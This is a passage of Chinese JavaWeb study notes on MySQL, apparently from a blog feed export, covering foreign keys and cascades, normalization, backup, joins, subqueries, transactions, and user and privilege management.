class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>删除外键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名 <span class="token keyword">DROP</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> 外键名称<span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> employee <span class="token keyword">DROP</span> <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> emp_dept_id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>在创建表之后添加外键</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> employee <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> emp_dep_id <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>dep_id<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> department<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="86-外键约束-级联操作"><a class="markdownIt-Anchor" href="#86-外键约束-级联操作">#</a> 8.6 外键约束 - 级联操作</h2><ol><li>添加外键，设置级联更新<ul><li>概念：父表的主键在更新时，子表的外键值也跟着更新</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>添加外键，设置级联删除<ul><li>概念：父表的主键在删除时，会自动删除子表外键中有该父表主键值的那一行数据</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>级联更新和删除可以在一行内一起使用，如</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> 表名称 <span class="token keyword">ADD</span> <span class="token keyword">CONSTRAINT</span> 外键名称 <span class="token keyword">FOREIGN</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span>外键字段<span class="token punctuation">)</span> <span class="token keyword">REFERENCES</span> 主表名称<span class="token punctuation">(</span>主表列明<span class="token punctuation">)</span> <span class="token keyword">ON</span> <span class="token keyword">UPDATE</span> <span class="token keyword">CASCADE</span> <span class="token keyword">ON</span> <span class="token keyword">DELETE</span> <span class="token keyword">CASCADE</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>实际开发情况中级联的使用是非常谨慎的</li></ul><h1 id="9-数据库的设计"><a class="markdownIt-Anchor" href="#9-数据库的设计">#</a> 9、数据库的设计</h1><ol><li>多表之间的关系</li><li>数据库设计的范式</li></ol><h2 id="91-多表之间的关系"><a class="markdownIt-Anchor" href="#91-多表之间的关系">#</a> 9.1 多表之间的关系</h2><ol><li>一对一（了解）：<ul><li>如：人和身份证</li><li>分析：一个人只有一个身份证，一个身份证也只能对应一个人</li></ul></li><li>一对多（多对一）：<ul><li>如：部门和员工</li><li>分析：一个部门有多个员工，一个员工只能对应一个部门</li></ul></li><li>多对多：<ul><li>如：学生和课程</li><li>分析：一个学生可以选择很多课程，一个课程也可以被很多学生选择</li></ul></li></ol><h2 id="92-一对多表关系实现"><a class="markdownIt-Anchor" href="#92-一对多表关系实现">#</a> 9.2 一对多表关系实现</h2><ul><li>如：部门和员工</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621205001667.png" alt="image-20220621205001667"></p><ul><li>实现方式：在多的地方去建立外键指向 1 的一方的主键</li><li>在员工表里添加一个外键指向部门表的主键</li></ul><h2 id="93-多对多表关系实现"><a class="markdownIt-Anchor" href="#93-多对多表关系实现">#</a> 9.3 多对多表关系实现</h2><ul><li>如：学生和课程</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621205745740.png" alt="image-20220621205745740"></p><ul><li>实现方式：借助第三章中间表，中间表至少包含两个字段，分别指向两个表的主键</li><li>两个字段要使用联合主键 ——foreign key (sid,cid);</li></ul><h2 id="94-一对一表关系实现"><a class="markdownIt-Anchor" href="#94-一对一表关系实现">#</a> 9.4 一对一表关系实现</h2><ul><li>如：人和身份证</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220621210236802.png" alt="image-20220621210236802"></p><ul><li>实现方式：在任何一方添加唯一外键指向另一方的主键</li><li>实际情况中一般会把两张表合成一张表</li></ul><h1 id="10-范式"><a class="markdownIt-Anchor" href="#10-范式">#</a> 10、范式</h1><ul><li>概念：在设计数据库时需要遵循的规范。要遵循后边的范式要求，必须先遵循前边的所有范式要求</li><li>分类：<ol><li>第一范式（1NF）：每一列都是不可分割的原子数据项</li><li>第二范式（2NF）：在第一范式的基础上，非码属性必须完全依赖于候选码（在 1NF 基础上消除非主属性对主码的部分函数依赖 ）<ul><li>几个概念<ol><li>函数依赖：A-----&gt;B，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，则称 B 依赖于 A</li><li>完全函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定需要 A 中所有的属性值</li><li>部分函数依赖：A-----&gt;B，如果 A 是一个属性组，则 B 属性值的确定只需要依赖于 A 属性组中某一些值即可</li><li>传递函数依赖：A-----&gt;B，B-----&gt;C，如果通过 A 属性（属性组）的值，可以确定唯一 B 属性的值，再通过 B 属性（属性组）的值可以确定唯一 C 属性的值，则称 C 传递函数依赖于 A</li><li>码：如果在一张表中，一个属性或属性组被其他所有属性所完全依赖，则称这个属性（属性组）为该表的码</li><li>主属性：码属性组中的所有属性</li><li>非主属性：除去码属性组的属性</li></ol></li></ul></li><li>第三范式（3NF）：在 2NF 的基础上，任何非主属性不依赖于其他非主属性（在 2NF 基础上消除传递依赖）</li></ol></li></ul><h1 id="11-数据库的备份和还原"><a class="markdownIt-Anchor" href="#11-数据库的备份和还原">#</a> 11、数据库的备份和还原</h1><h2 id="111-命令行"><a class="markdownIt-Anchor" href="#111-命令行">#</a> 11.1 命令行</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">备份：mysqldump -u用户名 -p密码 数据库名 <span class="token operator">></span> 保存的路径还原：<span class="token number">1</span>. 登录数据库<span class="token number">2</span>. 创建数据库<span class="token number">3</span>. 使用数据库<span class="token number">4</span>. 执行文件，source 文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="112-图形化工具"><a class="markdownIt-Anchor" href="#112-图形化工具">#</a> 11.2 图形化工具</h2><ul><li>根据使用的工具进行导出和导入</li></ul><h1 id="12-多表查询"><a class="markdownIt-Anchor" href="#12-多表查询">#</a> 12、多表查询</h1><ul><li>笛卡尔积：由两个集合 A,B，取这两个集合的所有组成情况</li><li>要完成多表查询，需要消除无用的数据</li><li>多表查询分类<ol><li>内连接查询</li><li>外连接查询</li><li>子查询</li></ol></li></ul><h2 id="121-多表查询-内连接"><a class="markdownIt-Anchor" href="#121-多表查询-内连接">#</a> 12.1 多表查询 - 内连接</h2><ul><li>内连接查询两张表中同时存在的数据，如果某一表的条件语句的字段为空，则这个结果不在结果表中显示</li></ul><ol><li>隐式内连接：使用 where 条件来消除无用的数据</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询所有员工信息和对应部门信息,一般查询的时候会查询部分字段，不会将所有字段都查出来</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">,</span>dept <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token comment">-- 查询员工表的名称，性别，部门表的名称</span><span class="token keyword">SELECT</span> emp<span class="token punctuation">.</span>name<span class="token punctuation">,</span>emp<span class="token punctuation">.</span>gende<span class="token punctuation">,</span>dept<span class="token punctuation">.</span>name <span class="token keyword">FROM</span> emp<span class="token punctuation">,</span>dept <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token comment">-- 查询员工表的名称，性别，部门表的名称，使用表的别名</span><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span>name<span class="token punctuation">,</span>t1<span class="token punctuation">.</span>gende<span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1<span class="token punctuation">,</span>dept t2 <span class="token keyword">where</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>显式内连接：<ul><li>语法：<strong>select 字段列表 from 表名 1 inner join 表名 2 on 条件；</strong></li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> dept <span class="token keyword">ON</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">JOIN</span> dept <span class="token keyword">ON</span> emp<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> dept<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622092940239.png" alt="image-20220622092940239"></p><ol start="3"><li>内连接查询注意事项：<ol><li>从哪些表中查询数据</li><li>查询条件是什么</li><li>查询哪些字段</li></ol></li></ol><h2 id="122-多表查询-外连接"><a class="markdownIt-Anchor" href="#122-多表查询-外连接">#</a> 12.2 多表查询 - 外连接</h2><ol><li>左外连接<ul><li>语法：<strong>select 字段列表 from 表 1 left [outer] join 表 2 on 条件；</strong></li><li>查询的是左表的所有数据以及两表的交集部分</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1 <span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> dept t2 <span class="token keyword">ON</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622093548771.png" alt="image-20220622093548771"></p><ol start="2"><li>右外连接<ul><li>语法：<strong>select 字段列表 from 表 1 right [outer] join 表 2 on 条件；</strong></li><li>查询的是右表的所有数据以及两表的交集部分</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> t1<span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">,</span>t2<span class="token punctuation">.</span><span class="token identifier"><span class="token punctuation">`</span>name<span class="token punctuation">`</span></span> <span class="token keyword">FROM</span> emp t1 <span class="token keyword">RIGHT</span> <span class="token keyword">JOIN</span> dept t2 <span class="token keyword">ON</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622093733605.png" alt="image-20220622093733605"></p><h2 id="123-多表查询-子查询"><a class="markdownIt-Anchor" href="#123-多表查询-子查询">#</a> 12.3 多表查询 - 子查询</h2><ul><li>概念：查询中嵌套查询，称嵌套的查询为子查询</li><li>基本演示</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询工资最高的员工信息</span><span class="token comment">-- 1.查询最高的工资是多少 9000</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">;</span><span class="token comment">-- 2.查询员工信息，并且工资等于9000的</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> salary <span class="token operator">=</span> <span class="token number">9000</span><span class="token punctuation">;</span><span class="token comment">-- 一条SQL完成查询，子查询</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>salary <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">MAX</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span> <span class="token keyword">FROM</span> emp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>子查询的不同情况</p><ol><li>子查询的结果是单行单列的<ul><li>子查询可以作为条件，使用<strong>运算符</strong>去判断。运算符：<strong>&gt; &lt; &gt;= &lt;= &lt;&gt; =</strong></li><li>查询工资小于平均工资的人</li><li>SELECT * FROM emp WHERE salary &lt; (SELECT AVG(salary) FROM emp);</li></ul></li><li>子查询的结果是多行单列的<ul><li>子查询可以作为条件，使用运算符 IN 来判断</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询`财务部`和`市场部`所有员工的信息</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> dept <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"财务部"</span> <span class="token operator">OR</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"市场部"</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">OR</span> dept_id <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> dept_id <span class="token operator">IN</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> dept <span class="token keyword">WHERE</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"财务部"</span> <span class="token operator">OR</span> <span class="token identifier"><span class="token punctuation">`</span>NAME<span class="token punctuation">`</span></span> <span class="token operator">=</span> <span class="token string">"市场部"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>子查询的结果是多行多列的<ul><li>子查询可以作为一张虚拟表来进行表的查询</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> dept t1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp <span class="token keyword">WHERE</span> emp<span class="token punctuation">.</span>join_date <span class="token operator">></span> <span class="token string">'2011-11-11'</span><span class="token punctuation">)</span> t2 <span class="token keyword">WHERE</span> t1<span class="token punctuation">.</span>id <span class="token operator">=</span> t2<span class="token punctuation">.</span>dept_id<span class="token punctuation">;</span><span class="token comment">-- 使用普通内连接查询</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> emp t1<span class="token punctuation">,</span> dept t2 <span class="token keyword">WHERE</span> t1<span class="token punctuation">.</span>dept_id <span class="token operator">=</span> t2<span class="token punctuation">.</span>id <span class="token operator">AND</span> t1<span class="token punctuation">.</span>join_date <span class="token operator">></span> <span class="token string">'2011-11-11'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622095410518.png" alt="image-20220622095410518"></p><h1 id="13-事务"><a class="markdownIt-Anchor" href="#13-事务">#</a> 13、事务</h1><ol><li>事务的基本介绍</li><li>事务的四大特征 **（常见面试题）**</li><li>事务的隔离级别（了解）</li></ol><h2 id="131-事务的基本介绍"><a class="markdownIt-Anchor" href="#131-事务的基本介绍">#</a> 13.1 事务的基本介绍</h2><ul><li>概念：如果一个包含多个步骤的业务操作，被事务管理，那么这些操作要么同时成功，要么同时失败</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622095951058.png" alt="image-20220622095951058"></p><ul><li><p>操作：</p><ol><li>开启事务：<strong>start transaction</strong></li><li>回滚：<strong>rollback</strong></li><li>提交：<strong>commit</strong></li></ol></li><li><p>MySQL 数据库中事务默认自动提交，Oracle 数据库默认是<strong>手动提交事务</strong></p><ul><li>事务提交的两种方式：<ul><li>自动提交：<ul><li>mysql 就是自动提交的</li><li>一条 DML（增删改）语句会自动提交一次事务</li></ul></li><li>手动提交：<ul><li>需要先开启事务，再提交</li></ul></li></ul></li><li>修改事务的默认提交方式</li></ul></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查看事务的默认提交方式</span><span class="token keyword">select</span> @<span class="token variable">@autocommmit</span><span class="token punctuation">;</span> <span class="token comment">#结果为1表示自动提交，结果为0表示手动提交</span><span class="token comment">-- 修改默认提交方式</span><span class="token keyword">set</span> @<span class="token variable">@autocommit</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">#这时候写了DML语句，不手动提交是不会生效的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="132-事务的四大特征"><a class="markdownIt-Anchor" href="#132-事务的四大特征">#</a> 13.2 事务的四大特征 ***</h2><ol><li>原子性：是不可分割的最小操作单位，要么同时成功，要么同时失败</li><li>持久型：当事务提交或回滚后，数据库会持久化地保存数据</li><li>隔离性：多个事务之间相互独立</li><li>一致性：事务操作前后数据总量不变</li></ol><h2 id="133-事务的隔离级别"><a class="markdownIt-Anchor" href="#133-事务的隔离级别">#</a> 13.3 事务的隔离级别</h2><ul><li><p>概念：多个事务之间是隔离的，相互独立的，但是如果多个事务操作同一批数据，则会引发问题，设置不同的隔离级别就可以解决这些问题。</p></li><li><p>存在的问题：</p><ol><li>脏读：一个事务，读取到另一个事务中没有提交的数据</li><li>不可重复度（虚读）：在同一个事务中两次读取到的数据不一样</li><li>幻读：一个事务操作（DML）数据表中所有的记录，另一个事务添加了一条数据，则第一个事务查询不到自己的修改</li></ol></li><li><p>隔离级别：</p><ol><li>read uncommitted：读未提交<ul><li>会产生的问题：脏读、不可重复度、幻读</li></ul></li><li>read committed：读已提交（Oracle 默认隔离级别）<ul><li>会产生的问题：不可重复度、幻读</li></ul></li><li>repeatable read：可重复度（MySQL 中默认隔离级别）<ul><li>会产生的问题：幻读</li></ul></li><li>serializable：串行化<ul><li>可以解决所有的问题</li></ul></li></ol></li><li><p>注意：隔离级别从小到大，安全性越来越高，但是效率越来越低</p></li><li><p>数据隔离级别查询和设置</p></li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询隔离级别：</span><span class="token keyword">select</span> @<span class="token variable">@tx_isolation</span><span class="token punctuation">;</span><span class="token comment">-- 设置隔离级别：</span><span class="token keyword">set</span> <span class="token keyword">global</span> <span class="token keyword">transaction</span> <span class="token keyword">isolation</span> <span class="token keyword">level</span> 级别字符串<span class="token punctuation">;</span> <span class="token comment">#字符串就是上面的4个</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="14-dcl管理用户授权"><a class="markdownIt-Anchor" href="#14-dcl管理用户授权">#</a> 14、DCL：管理用户，授权</h1><ul><li>DBA：数据库管理员<ol><li>管理用户</li><li>授权</li></ol></li></ul><h2 id="141-用户管理"><a class="markdownIt-Anchor" href="#141-用户管理">#</a> 14.1 用户管理</h2><ol><li>添加用户</li><li>删除用户</li><li>修改用户密码<ul><li>MySQL 中忘记 root 密码<ol><li>以 CMD 执行 net stop mysql 停止 mysql 服务（管理员权限）</li><li>使用无验证方式启动 MySQL 服务：mysqld --skip-grant-tables</li><li>打开新的 cmd 窗口，直接输入 mysql 命令回车就可以登录成功</li><li>use mysql;</li><li>update user set password = password (‘新密码’) where user = ‘root’;</li><li>关闭这两个窗口</li><li>打开任务管理器，手动结束 mysqld.exe 进程</li><li>使用新密码登录</li></ol></li></ul></li><li>查询用户<ul><li>通配符 %：表示可以在任意主机使用用户登录数据库</li></ul></li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 切换到mysql数据库</span><span class="token keyword">USE</span> mysql<span class="token punctuation">;</span><span class="token comment">-- 查询user表</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">USER</span><span class="token punctuation">;</span><span class="token comment">-- 创建用户</span><span class="token keyword">create</span> <span class="token keyword">user</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span> identified <span class="token keyword">by</span> <span class="token string">'密码'</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123'</span><span class="token punctuation">;</span><span class="token comment">-- 删除用户</span><span class="token keyword">DROP</span> <span class="token keyword">USER</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">DROP</span> <span class="token keyword">USER</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">-- 修改用户密码</span><span class="token keyword">UPDATE</span> <span class="token keyword">USER</span> <span class="token keyword">SET</span> PASSWORD <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">'新密码'</span><span class="token punctuation">)</span> <span class="token keyword">WHERE</span> <span class="token keyword">user</span> <span class="token operator">=</span> <span class="token string">'用户名'</span><span class="token punctuation">;</span><span class="token keyword">SET</span> PASSWORD <span class="token keyword">FOR</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span> <span class="token operator">=</span> PASSWORD<span class="token punctuation">(</span><span class="token string">'新密码'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="142-权限管理"><a class="markdownIt-Anchor" href="#142-权限管理">#</a> 14.2 权限管理</h2><ol><li>查询权限</li><li>授予权限</li><li>撤销权限</li></ol><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查询权限</span><span class="token keyword">SHOW</span> GRANTS <span class="token keyword">FOR</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">SHOW</span> GRANTS <span class="token keyword">FOR</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">-- 授予权限</span><span class="token keyword">GRANT</span> 权限列表 <span class="token keyword">ON</span> 数据库名<span class="token punctuation">.</span>表名 <span class="token keyword">TO</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">SELECT</span> <span class="token keyword">ON</span> db3<span class="token punctuation">.</span>dept <span class="token keyword">TO</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">ALL</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'zhangsan'</span><span class="token variable">@'localhost'</span><span class="token punctuation">;</span><span class="token comment">#将所有表的所有权限授予zhangsan</span><span class="token comment">-- 撤销权限</span><span class="token keyword">REVOKE</span> 权限列表 <span class="token keyword">ON</span> 数据库名<span class="token punctuation">.</span>表名 <span class="token keyword">FROM</span> <span class="token string">'用户名'</span><span class="token variable">@'主机名'</span><span class="token punctuation">;</span><span class="token keyword">REVOKE</span> <span class="token keyword">UPDATE</span> <span class="token keyword">ON</span> DB3<span class="token punctuation">.</span>ACCOUNT <span class="token keyword">FROM</span> <span class="token string">'LISI'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JavaWeb - 数据库&lt;/p&gt;
&lt;h1 id=&quot;1-数据库的相关概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-数据库的相关概念&quot;&gt;#&lt;/a&gt; 1、数据库的相关概念&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;数据库&lt;/li&gt;
&lt;li&gt;数据库管理系统</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>junit、反射</title>
    <link href="http://example.com/post/junit%E3%80%81%E6%B3%A8%E8%A7%A3%E3%80%81%E5%8F%8D%E5%B0%84.html"/>
    <id>http://example.com/post/junit%E3%80%81%E6%B3%A8%E8%A7%A3%E3%80%81%E5%8F%8D%E5%B0%84.html</id>
    <published>2022-06-19T12:28:37.000Z</published>
    <updated>2022-06-20T00:48:00.769Z</updated>
    
